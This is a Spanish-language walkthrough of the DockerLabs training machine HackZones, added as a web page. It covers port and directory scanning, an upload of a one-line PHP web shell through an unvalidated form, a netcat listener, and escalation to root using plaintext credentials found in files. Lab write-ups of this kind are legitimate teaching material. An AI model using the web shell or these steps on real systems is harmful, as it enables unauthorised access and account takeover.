@@ -1,0 +1,211 @@
+---
+title: HackZones
+description: Resolución completa de la máquina virtual *HackZones* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **HackZones**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un panel de usuario que permite la subida de archivos sin validación, facilitando la carga de una reverse shell en PHP y obteniendo acceso como `www-data`.
+Una vez dentro, se encuentra un script `secret.sh` que revela credenciales del usuario `mrrobot`. Posteriormente, se localiza un archivo `SistemUpdate` con las credenciales de `root`, completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'HackZones',
+    Autor: 'd1se0',
+    Dificultad: 'Media',
+    Fecha: '17/11/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip HackZones.zip
+sudo bash auto_deploy.sh HackZones.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p HackZones/{content,exploits,nmap,scripts}
+cd HackZones
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **53/tcp** — DNS
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764221660/Ports_bqnmmn.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,53,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+```
+
+Se identifica el dominio `hackzones.hl`. Se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 hackzones.hl" | sudo tee -a /etc/hosts
+```
+
+Se realiza un nuevo escaneo:
+
+```bash
+feroxbuster -u http://hackzones.hl/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764221658/Ferroxbuster_xczddf.png)
+
+**Rutas relevantes:**
+- `/index` — Página principal.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1764221659/IndexIp_qeoddc.png)
+- `/uploads` — Directorio accesible públicamente.
+- `/dashboard.html` — Panel de usuario con subida de archivos.
+  ![Dashboard](https://res.cloudinary.com/dewqswzke/image/upload/v1764221658/Dashboard_j2ce8k.png)
+
+---
+
+### 1.4 Enumeración DNS
+
+Se intenta una transferencia de zona:
+
+```bash
+dig axfr @172.17.0.2 hackzone.hl
+```
+
+No revela información útil para la explotación.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Subida de reverse shell
+
+El panel de usuario permite subir archivos sin validación. Se sube una reverse shell en PHP:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Se verifica en `/uploads`:
+
+![Uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1764221664/Uploads_wvtk3a.png)
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede al archivo:
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1764221660/Reverse_hp37mn.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → mrrobot
+
+Se encuentra el script `secret.sh` en `/var/www/html/supermegaultrasecrefolder`:
+
+![Secret.sh](https://res.cloudinary.com/dewqswzke/image/upload/v1764221661/Secret.sh_xlbtbx.png)
+
+El script revela una contraseña para el usuario `mrrobot`:
+
+```bash
+su mrrobot
+```
+
+![MrRobot](https://res.cloudinary.com/dewqswzke/image/upload/v1764221659/MrRobot_tjtfti.png)
+
+### 3.2 De mrrobot → root
+
+Se encuentra el archivo `SistemUpdate` con las credenciales de `root`:
+
+![SistemUpdate](https://res.cloudinary.com/dewqswzke/image/upload/v1764221663/SistemUpdate_nztlyh.png)
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764221661/Root_bbzs5o.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Subida de archivos sin validación",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Exposición de directorio /uploads",
+      severity: "Media",
+      impact: "Acceso a archivos subidos"
+    },
+    {
+      vulnerability: "Credenciales en texto plano en archivos del sistema",
+      severity: "Crítica",
+      impact: "Compromiso de cuentas de usuario"
+    }
+  ]}
+/>
